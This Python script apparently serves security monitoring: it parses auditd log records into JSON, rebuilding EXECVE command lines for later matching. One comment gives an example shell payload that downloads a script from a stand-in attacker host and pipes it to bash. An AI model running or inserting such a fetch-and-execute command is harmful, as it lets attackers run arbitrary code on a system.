from datetime import date
import json
import re

current_date = date.today().isoformat()
auditd_log = "/var/log/auditd.log.1"

# Quote-safe key=value tokenizer: treats "..." as one atomic value even if
# it contains spaces/pipes/etc. This replaces naive .split() wherever we
# pull key=value pairs out of raw audit content - which matters most for
# EXECVE argv fields since those are exactly where shell payloads with
# spaces show up (e.g. a2="curl -s http://evil.com/x.sh | bash").
KV_RE = re.compile(r'(\w+)=("(?:[^"\\]|\\.)*"|[^\s]+)')

HEX_RE = re.compile(r'^[0-9A-Fa-f]{2,}$')


def _kv_pairs(text):
    pairs = {}
    for m in KV_RE.finditer(text):
        pairs[m.group(1)] = m.group(2).strip('"')
    return pairs


def _maybe_hex_decode(value):
    """
    auditd hex-encodes EXECVE argument values that contain characters it
    considers unsafe to log as-is (control chars, some non-ASCII). If a
    raw a{N} value isn't quoted and looks like a hex blob, decode it;
    otherwise return it unchanged.
    """
    if HEX_RE.match(value) and len(value) % 2 == 0:
        try:
            return bytes.fromhex(value).decode("utf-8", errors="replace")
        except ValueError:
            return value
    return value


with open(auditd_log, "r") as logfile, \
     open(f"/var/log/auditd-{current_date}.json", "a") as jfile:
    for line in logfile:
        if 'auditd' not in line:
            continue
        try:
            # Split off the #035 suffix (record separator + resolved UID/AUID fields)
            main_part, _, suffix = line.partition('#035')
            # Split off the inner msg='...' content (present for userspace/PAM
            # records like USER_CMD/USER_AUTH; absent for kernel records like
            # SYSCALL/EXECVE)
            pre_inner, _, inner_and_rest = main_part.partition("msg='")
            inner_content = inner_and_rest.rstrip("'\n")

            # Positional fields: datetime, hostname, then program tag (e.g.
            # "auditd[1234]:"), THEN key=value pairs. Pull positionals off by
            # splitting only the leading whitespace-safe part, then run the
            # quote-safe key=value regex over the remainder instead of a
            # blind .split() - this is the fix for the quoting bug.
            first_ws = pre_inner.split(None, 2)
            datetime_str = first_ws[0] if len(first_ws) > 0 else None
            hostname     = first_ws[1] if len(first_ws) > 1 else None
            remainder    = first_ws[2] if len(first_ws) > 2 else ""

            outer_fields = _kv_pairs(remainder)
            # msg=audit(TS:ID): comes through as one token; strip trailing ':'
            if 'msg' in outer_fields:
                outer_fields['msg'] = outer_fields['msg'].rstrip(':')

            # Extract audit timestamp and event ID from msg=audit(TS:ID)
            audit_ts_match = re.match(r'audit\((\d+\.\d+):(\d+)\)', outer_fields.get('msg', ''))
            audit_timestamp = audit_ts_match.group(1) if audit_ts_match else None
            audit_event_id  = audit_ts_match.group(2) if audit_ts_match else None

            # Parse inner msg fields (userspace/PAM records only)
            inner_fields = _kv_pairs(inner_content) if inner_content else {}

            # Parse suffix resolved fields: UID="root" AUID="unset"
            suffix_fields = {}
            for m in re.finditer(r'(\w+)="([^"]*)"', suffix):
                suffix_fields[m.group(1)] = m.group(2)

            record_type = outer_fields.get('type')

            # --- EXECVE: reconstruct argv from a0, a1, ... aN ------------
            argv = None
            cmdline = None
            if record_type == 'EXECVE':
                argc_raw = outer_fields.get('argc')
                try:
                    argc = int(argc_raw) if argc_raw is not None else None
                except ValueError:
                    argc = None
                if argc is not None:
                    argv = []
                    for i in range(argc):
                        raw_val = outer_fields.get(f'a{i}')
                        if raw_val is None:
                            break
                        argv.append(_maybe_hex_decode(raw_val))
                    cmdline = " ".join(argv) if argv else None

            # --- exe/comm/op/acct: fall back to outer_fields for kernel
            # records (SYSCALL/EXECVE), which don't have a msg='...' block
            # so inner_fields is empty for them -------------------------
            exe  = inner_fields.get('exe')  or outer_fields.get('exe')
            comm = inner_fields.get('comm') or outer_fields.get('comm')
            op   = inner_fields.get('op')
            acct = inner_fields.get('acct')

            parsedline = {
                "datetime":        datetime_str,
                "hostname":        hostname,
                "type":            record_type,
                "audit_timestamp": audit_timestamp,
                "audit_event_id":  audit_event_id,
                "pid":             outer_fields.get('pid'),
                "ppid":            outer_fields.get('ppid'),
                "uid":             outer_fields.get('uid'),
                "auid":            outer_fields.get('auid'),
                "ses":             outer_fields.get('ses'),
                "op":              op,
                "acct":            acct,
                "exe":             exe,
                "comm":            comm,
                "syscall":         outer_fields.get('syscall'),
                "success":         outer_fields.get('success'),
                "src_hostname":    inner_fields.get('hostname'),
                "src_ip":          inner_fields.get('addr') or outer_fields.get('addr'),
                "terminal":        inner_fields.get('terminal'),
                "res":             inner_fields.get('res'),
                "argv":            argv,       # list, only populated for type=EXECVE
                "cmdline":         cmdline,     # space-joined argv, for easy regex matching
                "uid_resolved":    suffix_fields.get('UID'),
                "auid_resolved":   suffix_fields.get('AUID'),
            }
            json.dump(parsedline, jfile)
            jfile.write('\n')
        except (ValueError, IndexError, AttributeError) as e:
            print(f"Skipping malformed line: {e}\n  {line.strip()}")
